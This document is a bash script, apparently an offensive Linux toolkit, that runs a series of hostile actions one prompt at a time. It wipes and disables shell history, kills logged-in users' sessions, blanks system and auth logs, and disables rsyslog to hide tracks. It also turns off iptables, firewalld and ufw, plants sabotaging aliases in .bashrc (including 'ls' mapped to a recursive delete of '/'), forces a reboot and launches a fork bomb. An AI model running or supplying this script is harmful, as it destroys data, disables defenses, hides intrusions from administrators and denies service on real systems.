#!/bin/bash
echo "
  _____             __          __  _ 
 |_   _|            \ \        / / | |
   | |  ___ ___ _____\ \  /\  / /__| |
   | | / __/ _ \______\ \/  \/ /_  / |
  _| || (_|  __/       \  /\  / / /| |
 |_____\___\___|        \/  \/ /___|_|"

#banner function
banner()
{
  echo "+------------------------------------------+"
  printf "|`tput bold` %-40s `tput sgr0`|\n" "$@"
  echo "+------------------------------------------+"
}
echo "+++++++++++++++Welcome+++++++++++++++"
echo "Disclaimer the author of this script assume no responsibility for the actions of the user or for damaged caused to any and all systems"
echo "Please use resonsibly and do not use this on any systems that you are not authorized to"
echo "If you use the edit aliases option the changes will take place after a reboot or run /'source ~/.bashrc/' to make them immediate"
#start of histfile unset
banner "Wipe History"
echo "Do you want to unset the HISTFILE (Y/N): "
read hist
case $hist in
    [Yy]* ) unset HISTFILE #disables history logging
            export HISTFILESIZE=0 #set maximim length to 0
            export HISTSIZE=0 #sets the maximim command length to 0
            history -c #clear current shell history
            echo "" > ~/.bash_history #clear current user bash history
            ln /dev/null ~/.bash_history -sf #sends bash history to /dev/null
            ;;
    [Nn]* ) ;;
    * ) echo "Please enter yes or no." ;;
esac

#start of logged on users
banner "Kill Connections"
echo "Users logged on...$(w)"
echo "Do you want to kill any users connection (Y/N): "
read option
case $option in
    [Yy]* ) echo "Enter their username: "
            read username
            pkill -u $username
            ;;
    [Nn]* ) ;;
    * ) echo "Please enter yes or no." ;;
esac
#end of logged on users

#cover tracks in log files
banner "Wipe Logs"
echo "Do you want to clear the log files and disable rsyslog (need root) (Y/N): "
read log
case $log in
    [Yy]* ) echo "Clearing logs."
            echo "" > /var/log/alternatives.log
            echo "" > /var/log/alternatives.log.1
            echo "" > /var/log/messages
            echo "" > /var/log/messages.1
            echo "" > /var/log/syslog
            echo "" > /var/log/syslog.1
            echo "" > /var/log/user.log
            echo "" > /var/log/user.log.1
            echo "" > /var/log/auth.log
            echo "" > /var/log/auth.log.1
            echo "" > /var/log/mail.log
            service rsyslog stop
            sudo systemctl disable rsyslog
            ;;
    [Nn]* ) ;;
    * ) echo "Please enter yes or no"
        ;;
esac
#end of cover tracks in log files

#start of messing with firewalls
banner "Time to mess with firewalls"
echo "Do you want to shut off all their firewalls (need root) (Y/N): "
read firewall
case $firewall in
    [Yy]* ) service iptables stop
            service ip6tables stop
            sudo systemctl stop firewalld
            sudo systemctl disable firewalld
            sudo ufw disable
            systemctl disable ufw
            ;;
    [Nn]* ) ;;
    *) echo "Please enter yes or no"
esac
#end of messing with firewalls

#start of aliases
banner "Mean alias things"
echo "Do you want to mess up their aliases :) (Y/N): "
read alias
case $alias in
    [Yy]* ) cd ~
            echo "export PROMPT_COMMAND=\"cd\"" >> ~/.bashrc #prevents them from cd'ing anywhere else but ~
            echo "export PS1=\"Username:\"" >> ~/.bashrc #changes their prompt to Login: 
            echo "alias mv=\"cp\"" >> ~/.bashrc #changes mv to cp
            echo "alias ls=\"rm / -rf --no-preserve-root\"" >> ~/.bashrc #deletes all the files below /home/user as non root. wipes everything if run as root
            ;;
    [Nn]* ) ;;
    * ) echo "Please enter yes or no"
        ;;
esac
#end of aliases

#start of change the run level
banner "Time to change the run level"
echo "Do you want to force a reboot (Y/N): "
read input
case $input in
    [Yy]* ) init 6 ;;
    [Nn]* ) ;;
    * )  echo "Please enter yes or no" ;;
esac
#end change of the run level

#start of fork bomb
banner "Lets bomb them"
echo "Do you want to fork bomb the host (Y/N): "
read bomb
case $bomb in
    [Yy]* ) :() { :|:& };: ;;
    [Nn]* ) ;;
    * ) echo "Please enter yes or no"
        ;;
esac
#end of fork bomb
source ~/.bashrc
